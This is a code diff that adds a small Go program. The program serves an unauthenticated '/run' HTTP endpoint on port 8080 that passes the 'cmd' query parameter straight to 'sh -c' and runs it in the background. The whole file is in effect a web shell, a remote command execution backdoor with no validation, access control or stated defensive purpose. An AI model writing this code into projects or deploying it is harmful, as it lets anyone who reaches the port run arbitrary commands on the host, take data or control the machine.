@@ -1,0 +1,14 @@
+package main
+import ("net/http"; "os/exec")
+func runLater(command string) {
+  go func() {
+    cmd := exec.Command("sh", "-c", command)
+    _ = cmd.Run()
+  }()
+}
+func handler(w http.ResponseWriter, r *http.Request) {
+  command := r.URL.Query().Get("cmd")
+  runLater(command)
+  w.Write([]byte("started"))
+}
+func main() { http.HandleFunc("/run", handler); http.ListenAndServe(":8080", nil) }
